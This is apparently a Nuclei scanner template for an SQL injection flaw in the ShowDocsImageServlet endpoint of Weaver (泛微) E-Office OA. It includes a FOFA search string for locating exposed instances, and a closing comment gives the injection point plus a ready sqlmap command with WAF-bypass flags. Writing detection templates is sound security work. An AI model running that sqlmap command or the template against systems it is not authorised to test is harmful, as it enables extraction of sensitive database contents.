id: weaver-showdocsimageservlet-sqli

info:
  name: 泛微 OA ShowDocsImageServlet - sqli
  author: heiye798
  severity: high
  description: 泛微 ShowDocsImageServlet处存在sql注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。
  metadata:
    verified: true
    fofa: app="泛微-E-Weaver"
  tags: weaver,weaver,sqli,oa

http:
  - raw:
      - |
        GET /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'JFIF'

      - type: status
        status:
          - 200

# POC为：/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=*
# 由于存在防火墙的原因，请手工进行验证 sqlmap -u "/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=*" --random-agent --skip-waf
